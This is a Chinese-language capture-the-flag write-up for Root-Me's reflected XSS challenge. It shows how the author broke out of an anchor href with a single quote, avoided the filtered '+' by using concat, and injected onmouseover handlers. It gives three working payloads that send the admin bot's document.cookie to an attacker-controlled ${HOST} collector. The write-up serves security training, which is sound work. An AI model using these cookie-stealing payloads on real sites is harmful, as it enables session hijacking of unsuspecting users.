## [[Root-Me](https://www.root-me.org/)] [[Web-Client](https://www.root-me.org/en/Challenges/Web-Client/)] [[XSS - Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)] [[解题报告](http://exp-blog.com/2019/01/02/pid-2683/)]

------

题目已经提示是反射型 XSS 的题型，但题目已经提示了 **admin 不会点击所有可疑的 XSS 链接**， 亦即我们要想办法令我们的 XSS 在 **不被点击** 的前提下触发。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B13%5D%20%5B45P%5D%20XSS%20-%20Reflected/imgs/01.png)

看过了所有页面，只有在 Contact us 页面的留言区有输入点，但不是注入点，因为留言后页面提示这里会扔掉所有消息并不会查看。

查看页面源码，发现有一个隐藏页面 Security ， 但打开发现是个 404 页面。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B13%5D%20%5B45P%5D%20XSS%20-%20Reflected/imgs/02.png)

不过注意到，修改 URL 中的 `?p=${xxx}` ， 404 页面中会对应打印 `The page ${xxx} could not be found.` ，其中 `${xxx}` 被嵌入到 &lt;a&gt; 标签的 href 属性：`<a href="?p=${xxx}" >${xxx}</a>`，怀疑这里可能是一个 XSS 注入点。

不过测试发现，这个注入点对很多 html 符号做了过滤，`<>"+` 等符号都被过滤了，注入难度较高。唯独单引号 `'` 没有被过滤，因此可以用它来关闭前一个 href 属性，注入可以触发 XSS 的属性。

尝试构造 URL 的 payloads 参数：`?p=exp' onmousemove='alert(1)`，发现 &lt;a&gt; 标签被注入成为 `<a href="?p=exp" onmousemove="alert(1)">`，亦即成功注入了 `onmousemove` 属性，当鼠标经过这个链接时，就会触发 XSS 。

而之所以注入 `onmousemove` 属性而非 `onclick` 属性，是因为题目已经明确表示  **admin 不会点击所有可疑的 XSS 链接** ，因此注入的 XSS 行为是不能通过点击触发的，且必须是 js 脚本。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B13%5D%20%5B45P%5D%20XSS%20-%20Reflected/imgs/03.png)

据此可以构造真正的 payloads 了，下面几条都是我构造的有效 payloads ，任选一条均可。其中 `${HOST}` 是通过 [RequestBin](https://requestbin.fullcontact.com/) 生成的临时 HTTP 服务器：

```javascript
# 注意构造 payloads 的时候必须清楚哪些字符是被过滤的，尤其是 +，此处用 concat 代替
# 这 3 条 payloads 任一条均可用
exp' onmouseover='document.location=%22${HOST}?%22.concat(document.cookie)
exp' onmouseover='document.write(%22<img src=${HOST}?%22.concat(document.cookie).concat(%22 />%22))
exp' onmouseover='setTimeout(function()%7Bdocument.location=%22${HOST}?%22.concat(document.cookie);%7D,1)
```

点击 `REPORT TO THE ADMINISTRATOR` 按钮提交 payloads， 然后在 `${HOST}` 等待 robot 触发 XSS 即可（大概需要一分钟）。若触发成功则会收到一个 flag ，完成挑战。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B13%5D%20%5B45P%5D%20XSS%20-%20Reflected/imgs/04.png)
![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Client/%5B13%5D%20%5B45P%5D%20XSS%20-%20Reflected/imgs/05.png)

> 本题要点：
<br/>　　○ flag 是在 cookie 里面的，因此必须窃取 `document.cookie`
<br/>　　○ 必须要清楚哪些字符被过滤了，尤其注意 `+` 也是在过滤列表中，即使编码成 `%2B` 也绕不过去，很多同学构造号 payloads 后，在本地可以触发，但是提交后 rotbot 却不触发，就是这个原因。
<br/>　　○ `onmousemove`、`onmouseover`、`onmouseenter`、`onmouseout` 等 &lt;a&gt; 的属性都是可以被 rotbot 触发的
<br/>　　○ robot 真的很仿真，而且似乎还担心触发不到事件，只要 payloads 是对的，就会连续触发 5 次

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
